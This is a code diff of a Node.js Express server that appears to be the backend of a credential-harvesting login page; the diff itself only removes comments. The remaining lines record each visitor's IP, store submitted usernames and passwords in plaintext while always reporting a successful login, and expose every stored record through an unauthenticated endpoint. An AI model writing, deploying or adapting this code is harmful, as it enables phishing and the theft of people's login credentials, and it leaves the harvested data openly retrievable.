@@ -23,7 +23,6 @@ function saveRecord(type, username = null, password = null, ip = 'Unknown') {
         [type, username, password, ip, timestamp]);
 }
 
-// Record every visit
 app.get('/', (req, res) => {
     saveRecord('Page Visit', null, null, req.ip || req.headers['x-forwarded-for']);
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
@@ -34,14 +33,12 @@ app.get('/login.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
-// Login
 app.post('/api/login', (req, res) => {
     const { username, password } = req.body;
     saveRecord('Login Attempt', username, password, req.ip || req.headers['x-forwarded-for']);
     res.json({ success: true });
 });
 
-// Get records
 app.get('/api/records', (req, res) => {
     db.all("SELECT * FROM records ORDER BY id DESC", [], (err, rows) => {
         res.json(rows);
